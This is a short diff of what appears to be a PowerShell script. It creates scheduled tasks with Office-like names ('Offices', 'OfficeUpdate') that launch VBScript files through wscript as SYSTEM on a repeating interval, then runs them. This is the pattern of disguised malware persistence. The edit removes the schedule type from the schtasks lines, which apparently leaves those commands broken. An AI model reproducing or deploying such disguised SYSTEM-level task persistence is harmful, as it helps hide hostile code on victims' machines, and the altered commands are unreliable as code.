@@ -23,9 +23,11 @@ $r >> $filepath3
 $ws = "wscript //e:vbscript " + $filepath1
 $ws1 = "wscript //e:vbscript " + $filepath2
 
-schtasks /create /tn "Offices" /tr $ws /sc minute /mo 50 /ru System /F
-schtasks /create /tn "Offices" /tr $ws1 /sc minute /mo 50 /ru System /F
+schtasks /create /tn "Offices" /tr $ws /mo 50 /ru System /F
+schtasks /create /tn "Offices" /tr $ws1 /mo 50 /ru System /F
+
 
 schtasks /run /tn "Offices"
 sleep 5
 schtasks /run /tn "OfficeUpdate"
+
